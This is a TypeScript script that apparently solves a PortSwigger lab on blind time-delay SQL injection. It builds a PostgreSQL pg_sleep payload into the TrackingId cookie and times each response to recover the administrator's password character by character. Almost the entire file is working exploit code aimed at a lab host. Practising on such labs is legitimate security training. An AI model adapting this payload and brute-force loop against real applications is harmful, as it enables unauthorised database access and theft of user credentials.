/**
 * PortSwigger Lab: Blind SQL injection with time delays and information retrieval
 * https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
 */

import { Sess } from "../base"

const LABID = "0a7e00b7042226c281610c68006c00ad"

const iter = async (index: number, char: string) => {
	const start = Date.now()
	await Sess.req`
		GET / HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: TrackingId=x'%7c%7c%20(SELECT%20pg_sleep(10)%20FROM%20users%20WHERE%20username%20%3d%20'administrator'%20AND%20substring(password%2c%20${index}%2c%201)%20%3d%20'${char}')%20--%20; session=rLc75SvsY2vPO6JR5KZupODt9YGzdYWi
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Mobile: ?0
		Sec-Ch-Ua-Platform: "macOS"
		Upgrade-Insecure-Requests: 1
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.6
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: navigate
		Sec-Fetch-User: ?1
		Sec-Fetch-Dest: document
		Referer: https://${LABID}.web-security-academy.net/login
		Accept-Encoding: gzip, deflate, br
	`
	return Date.now() - start > 10000
}

let index = 1
let password = ""
const chars = "abcdefghijklmnopqrstuvwxyz0123456789".split("")

for (let i = 0; i < 50; i++) {
	let found = false
	for (const char of chars) {
		if (await iter(index, char)) {
			console.log(`SUCCESS CHAR ${index}: ${char}`)
			password += char
			found = true
			break
		}
	}

	if (found) {
		index++
	} else {
		console.log(`FAILURE CHAR ${index}`)
		break
	}
}

console.log(`PASSWORD: ${password}`)
